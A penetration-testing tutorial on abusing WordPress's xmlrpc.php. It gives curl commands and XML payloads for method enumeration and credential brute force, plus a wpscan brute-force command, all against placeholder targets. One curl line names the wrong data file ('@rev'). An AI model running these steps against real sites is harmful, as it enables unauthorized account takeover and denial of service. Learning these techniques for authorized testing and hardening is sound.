**xmlrpc.php** is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism.

#### Risks of xmlrpc.php

1. **Brute Force Attacks**: Attackers can automate login attempts via XML-RPC, bypassing traditional login protections.
2. **DDoS Attacks**: Attackers can exploit XML-RPC to send multiple requests, overloading the server or launching amplified DDoS attacks.
3. **Pingback Amplification**: Malicious pingback requests can be used to reflect traffic to other sites, creating a DDoS attack.
4. **Vulnerabilities**: Older WordPress versions may have exploitable bugs in `xmlrpc.php`, enabling remote code execution (RCE) or other attacks.

#### Attack process
Check if `xmlrpc.php` exists and is active on the target site. Create an XML file named `list_methods.xml` with the following content:

```bash
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>
```

Use `curl` to send the XML file as a POST request:

```bash
curl -X POST -H "Content-Type: application/xml" --data @rev http://<target_ip>/xmlrpc.php
```

If the file is active, the response will list all supported methods, such as:

- `getUsersBlogs`
- `wp.getCategories`
- `system.multicall`
- `pingback.ping`

Next, create a file named `bruteforce.xml`:

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password123</string></value></param>
  </params>
</methodCall>
```

Send the payload using `curl`:

```bash
curl -X POST -H "Content-Type: application/xml" --data @bruteforce.xml http://<target_ip>/xmlrpc.php
```

If the response contains valid blog information, the credentials are correct. Automate this process for multiple attempts with tools like `wpscan` or custom scripts.

#### Attack process using WPScan

WPScan simplifies brute force attacks and XML-RPC vulnerability scans.

```bash
wpscan --url http://<target_ip>/ --enumerate u,vp,t --random-agent --passwords /path/to/passwords.txt --usernames /path/to/usernames.txt
```

#### Using Custom Scripts

For fine-grained control, use custom scripts like [kill-xmlrpc](https://github.com/R-kill-9/kill-xmlrpc) to automate brute force or exploitation.